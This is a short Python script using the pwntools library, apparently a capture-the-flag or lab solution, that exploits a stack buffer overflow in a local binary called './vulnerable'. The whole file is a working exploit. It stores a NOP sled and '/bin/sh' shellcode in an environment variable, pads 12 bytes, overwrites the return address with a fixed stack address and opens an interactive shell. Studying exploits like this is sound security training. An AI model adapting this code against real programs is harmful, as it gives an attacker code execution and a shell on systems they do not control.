#!/usr/bin/env python

from pwn import *

BIN = "./vulnerable"
context.binary = BIN

# Generate vars: a shellcode, return address offset, target address.
nopsled = b"\x90" * 2000
shellcode = asm(shellcraft.sh())
ret_offset = 12

# Generate process, with SHELLCODE as an env var.
io = process(BIN, env= { 'SHELLCODE' : nopsled + shellcode })
target = 0x7fffffffeb9a

# Craft payload.
payload = b"A" * ret_offset
payload += pack(target)

# Send payload.
io.sendline(payload)

io.interactive()
